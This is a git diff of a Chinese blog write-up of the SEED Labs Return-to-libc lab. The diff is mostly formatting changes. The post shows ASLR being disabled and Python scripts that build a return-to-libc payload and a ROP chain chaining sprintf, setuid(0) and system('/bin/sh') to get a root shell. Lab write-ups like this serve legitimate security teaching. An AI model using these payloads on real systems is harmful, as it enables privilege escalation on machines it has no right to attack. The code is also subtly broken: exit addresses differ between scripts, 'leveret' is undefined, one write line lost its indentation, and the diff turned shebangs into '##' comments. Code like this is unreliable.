@@ -1,9 +1,9 @@
 ---
 layout: post
-title:  "【SEED Labs】Return-to-libc Attack and ROP"
+title:  "Return-to-libc Attack and ROP"
 date:   2020-07-01 00:00:00 +0800
 categories: 实验
-tags: SEEDLab 安全
+tags: seedlab return-to-libc
 comments: 1
 mathjax: true
 copyrights: 原创
@@ -11,22 +11,22 @@ copyrights: 原创
 
 本文为 [SEED Labs 2.0 - Return-to-libc Attack Lab](https://seedsecuritylabs.org/Labs_20.04/Software/Return_to_Libc/) 的实验记录。
 
-# 实验原理
+## 实验原理
 
 <img src="./../assets/post/images/Vzj3RKYhni9FEuo.png" alt="img" style="zoom: 67%;" />
 
-# Task 1: Finding out the Addresses of libc Functions
+## Task 1: Finding out the Addresses of libc Functions
 
 关闭地址随机化
 
 ```bash
-$ sudo sysctl -w kernel.randomize_va_space=0
+sudo sysctl -w kernel.randomize_va_space=0
 ```
 
 修改链接
 
 ```bash
-$ sudo ln -sf /bin/zsh /bin/sh
+sudo ln -sf /bin/zsh /bin/sh
 ```
 
 使用 gdb调试
@@ -46,7 +46,7 @@ gdb-peda$ quit
 
 <img src="./../assets/post/images/GePwFUSLofaqIcX.png" alt="image-20210713150033546" style="zoom:50%;" />
 
-# Task 2: Putting the shell string in the memory
+## Task 2: Putting the shell string in the memory
 
 新建 MYSHELL 环境变量
 
@@ -59,9 +59,9 @@ gdb-peda$ quit
 #include<stdio.h>
 
 void main(){
-	char* shell = getenv("MYSHELL");
-	if (shell)
-	printf("%x\n", (unsigned int)shell);
+    char* shell = getenv("MYSHELL");
+    if (shell)
+        printf("%x\n", (unsigned int)shell);
 }
 ```
 
@@ -71,7 +71,7 @@ void main(){
 
 <img src="./../assets/post/images/62c1hWbSXFRMeOo.png" alt="image-20210713152415930" style="zoom:50%;" />
 
-# Task 3: Launching the Attack
+## Task 3: Launching the Attack
 
 根据前面得到的结果，将程序改为
 
@@ -79,7 +79,7 @@ void main(){
 #!/usr/bin/env python3
 import sys
 
-# Fill content with non-zero values
+## Fill content with non-zero values
 content = bytearray(0xaa for i in range(300))
 
 X = Y+8
@@ -94,7 +94,7 @@ Z = Y+4
 exit_addr = 0xf7e04f80 # The address of exit()
 content[Z:Z+4] = (exit_addr).to_bytes(4,byteorder='little')
 
-# Save content to a file
+## Save content to a file
 with open("badfile", "wb") as f:
 f.write(content)
 ```
@@ -105,7 +105,7 @@ f.write(content)
 
 <img src="./../assets/post/images/dAs5V9c7vYnq42k.png" alt="image-20210713163255852" style="zoom:50%;" />
 
->  **Attack variation 1:** Is the `exit()` function really necessary? Please try your attack without including
+> **Attack variation 1:** Is the `exit()` function really necessary? Please try your attack without including
 > the address of this function in badfile. Run your attack again, report and explain your observations.
 
 根据 task 要求，我们将 exploit.py 中 exit 的部分注释掉，然后重新运行。
@@ -129,12 +129,12 @@ f.write(content)
 
 由此可见，这与程序名的长度有关。
 
-# Task 4: Defeat Shell’s countermeasure
+## Task 4: Defeat Shell’s countermeasure
 
 改回链接
 
 ```bash
-$ sudo ln -sf /bin/dash /bin/sh
+sudo ln -sf /bin/dash /bin/sh
 ```
 
 为了使攻击更加方便，我们直接使用 ROP。首先获取所需要的 libc 函数地址
@@ -148,7 +148,7 @@ $ sudo ln -sf /bin/dash /bin/sh
 同时我们还有 retlib 打印出的 `bof()` 函数 ebp 位置和 MYSHELL 地址，根据这些修改 exploit.py
 
 ```python
-# !/usr/bin/python3
+## !/usr/bin/python3
 import sys
 
 def tobytes (value):
@@ -164,19 +164,19 @@ system_addr = 0xf7e12420
 exit_addr = 0xf7e4f80
 ebp_bof = 0xffffcd58
 
-# setuid()'s 1st argument
+## setuid()'s 1st argument
 sprintf_argl = ebp_bof + 12 + 5*0x20
 
-# a byte that contains 0x00
+## a byte that contains 0x00
 sprintf_arg2 = sh_addr + len("/bin/sh")
 
-# Use leaveret to return to the first sprintf()
+## Use leaveret to return to the first sprintf()
 ebp_next = ebp_bof + 0x20
 content += tobytes(ebp_next)
 content += tobytes(leaveret)
 content += b'A' * (0x20 - 2*4)
 
-# sprintf(sprintf_argl, sprintf_arg2)
+## sprintf(sprintf_argl, sprintf_arg2)
 for i in range(4):
     ebp_next += 0x20
     content += tobytes(ebp_next)
@@ -187,7 +187,7 @@ for i in range(4):
     content += b'A' * (0x20 - 5*4)
     sprintf_argl += 1
 
-# setuid(0)
+## setuid(0)
 ebp_next += 0x20
 content += tobytes(ebp_next)
 content += tobytes(setuid_addr)
@@ -195,7 +195,7 @@ content += tobytes(leaveret)
 content += tobytes(0xFFFFFFFF)
 content += b'A' * (0x20 - 4*4)
 
-# system("/bin/sh")
+## system("/bin/sh")
 ebp_next += 0x20
 content += tobytes(ebp_next)
 content += tobytes(system_addr)
@@ -203,11 +203,11 @@ content += tobytes(leaveret)
 content += tobytes(sh_addr)
 content += b'A' * (0x20 - 4*4)
 
-# exit()
+## exit()
 content += tobytes(0xFFFFFFFF)
 content += tobytes(exit_addr)
 
-# Write the content to a file
+## Write the content to a file
 with open("badfile", "wb") as f:
     f.write (content)
 ```
@@ -221,7 +221,7 @@ with open("badfile", "wb") as f:
 
 <img src="./../assets/post/images/wq9mP1fk34vJYNV.png" alt="image-20210714044535215" style="zoom:50%;" />
 
-# Task 5: Return-Oriented Programming
+## Task 5: Return-Oriented Programming
 
 由于我们上一个 Task 已经使用了 ROP，所以这一个 Task 只要稍作修改即可。
 
@@ -232,7 +232,7 @@ with open("badfile", "wb") as f:
 然后修改 exploit.py
 
 ```python
-# !/usr/bin/python3
+## !/usr/bin/python3
 import sys
 
 def tobytes (value):
@@ -249,19 +249,19 @@ exit_addr = 0xf7e4f80
 ebp_bof = 0xffffcd58
 foo_addr = 0x565562d0 # CHANGED!
 
-# setuid()'s 1st argument
+## setuid()'s 1st argument
 sprintf_argl = ebp_bof + 12 + 5*0x20
 
-# a byte that contains 0x00
+## a byte that contains 0x00
 sprintf_arg2 = sh_addr + len("/bin/sh")
 
-# Use leaveret to return to the first sprintf()
+## Use leaveret to return to the first sprintf()
 ebp_next = ebp_bof + 0x20
 content += tobytes(ebp_next)
 content += tobytes(leaveret)
 content += b'A' * (0x20 - 2*4)
 
-# sprintf(sprintf_argl, sprintf_arg2)
+## sprintf(sprintf_argl, sprintf_arg2)
 for i in range(4):
     ebp_next += 0x20
     content += tobytes(ebp_next)
@@ -272,7 +272,7 @@ for i in range(4):
     content += b'A' * (0x20 - 5*4)
     sprintf_argl += 1
 
-# setuid(0)
+## setuid(0)
 ebp_next += 0x20
 content += tobytes(ebp_next)
 content += tobytes(setuid_addr)
@@ -287,7 +287,7 @@ for i in range(10): # CHANGED!
     content += tobytes(leveret)
     content += b'A'*(0x20-3*4)
 
-# system("/bin/sh")
+## system("/bin/sh")
 ebp_next += 0x20
 content += tobytes(ebp_next)
 content += tobytes(system_addr)
@@ -295,11 +295,11 @@ content += tobytes(leaveret)
 content += tobytes(sh_addr)
 content += b'A' * (0x20 - 4*4)
 
-# exit()
+## exit()
 content += tobytes(0xFFFFFFFF)
 content += tobytes(exit_addr)
 
-# Write the content to a file
+## Write the content to a file
 with open("badfile", "wb") as f:
     f.write (content)
 ```
@@ -308,6 +308,6 @@ with open("badfile", "wb") as f:
 
 <img src="./../assets/post/images/kGs2PwHXYTzRQyu.png" alt="image-20210714052903073" style="zoom:50%;" />
 
-# 实验总结
+## 实验总结
 
 实验总体难度一般。Task1 - 3 依葫芦画瓢即可，没有难度；Task4 难度较大，但我大炮轰蚊子，直接用 ROP 解决了 0 如何输入的问题；由此一来，Task5 就很容易解决了。
